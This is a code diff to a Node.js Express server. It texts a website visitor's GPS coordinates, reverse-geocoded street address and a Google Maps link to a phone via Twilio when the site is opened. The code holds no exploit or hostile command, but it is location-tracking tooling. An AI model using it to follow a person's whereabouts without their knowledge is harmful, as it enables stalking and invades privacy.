@@ -1,6 +1,7 @@
 require("dotenv").config();
 const express = require("express");
 const twilio = require("twilio");
+const fetch = require("node-fetch");
 
 const app = express();
 app.use(express.json());
@@ -11,15 +12,39 @@ const client = twilio(
   process.env.TWILIO_AUTH_TOKEN
 );
 
-// Only send the first time the website loads
+// Only send once when website opens
 let hasSentFirstLocation = false;
+
+// Reverse geocode function
+async function getAddress(lat, lng) {
+  const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`;
+  const res = await fetch(url, {
+    headers: { "User-Agent": "LocationApp/1.0" }
+  });
+  const data = await res.json();
+  return data.display_name || "Address unavailable";
+}
 
 app.post("/api/track", async (req, res) => {
   const data = req.body;
 
-  // Format the message
-  const messageText = `
+  try {
+    // Get street address
+    const address = await getAddress(data.latitude, data.longitude);
+
+    // Google Maps link
+    const mapsLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+
+    // Build message
+    const messageText = `
 📍 Location Update (Website Opened)
+
+Address:
+${address}
+
+Google Maps:
+${mapsLink}
+
 Latitude: ${data.latitude}
 Longitude: ${data.longitude}
 Accuracy: ${data.accuracy}m
@@ -32,10 +57,9 @@ Easting: ${data.utm.easting}
 Northing: ${data.utm.northing}
 
 Timestamp: ${new Date(data.timestamp).toLocaleString()}
-  `;
+    `;
 
-  try {
-    // Only send ONCE when the website first loads
+    // Only send once
     if (!hasSentFirstLocation) {
       await client.messages.create({
         body: messageText,
@@ -49,7 +73,7 @@ Timestamp: ${new Date(data.timestamp).toLocaleString()}
 
     res.sendStatus(200);
   } catch (err) {
-    console.error("Twilio error:", err);
+    console.error("Error:", err);
     res.sendStatus(500);
   }
 });
